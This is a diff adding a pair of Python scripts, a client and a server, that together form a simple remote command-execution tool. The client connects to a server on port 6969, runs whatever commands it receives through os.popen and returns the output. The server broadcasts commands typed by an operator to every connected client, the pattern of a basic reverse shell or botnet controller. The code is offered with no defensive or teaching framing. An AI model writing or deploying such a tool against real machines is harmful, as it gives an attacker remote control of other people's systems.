@@ -1,0 +1,60 @@
+CLIENT:
+import socket
+import threading
+import os
+
+socket = socket.socket()
+host = '127.0.0.1'
+port = 6969
+
+try:
+    socket.connect((host, port))
+    print("Connected to the server")
+except:
+    print("There was an error connecting to the server please try again")
+
+def Communication():
+    res = socket.recv(1024)
+    res = res.decode("utf-8")
+    try:
+        output =  os.popen(res)
+        sender = str(socket.getsockname()) + " sent back>> "
+        socket.send(sender.encode("utf-8") + output.read().encode("utf-8"))
+        print("command executed and sent to server")
+    except:
+        print("Command not found")
+        socket.send("Command not found".encode("utf-8"))
+
+for _ in range(100):
+    threading.Thread(target=Communication).start()
+  
+SERVER:
+
+import socket
+import threading
+
+CLIENTS = {}
+host = "127.0.0.1"
+port = 6969
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((host, port))
+s.listen(5)
+print("Server started")
+
+def client_cmd(conn):
+    while True:
+        client_send = input("Command for clients: ").encode("utf-8")
+        if not client_send:
+            break
+        for client in CLIENTS.values():
+            client.send(client_send)
+        data = conn.recv(2048)
+        print(data.decode("utf-8"))
+
+    del CLIENTS[conn.fileno()]
+
+while True:
+    conn, addr = s.accept()
+    CLIENTS[conn.fileno()] = conn
+    threading.Thread(target=client_cmd, args=(conn,)).start()
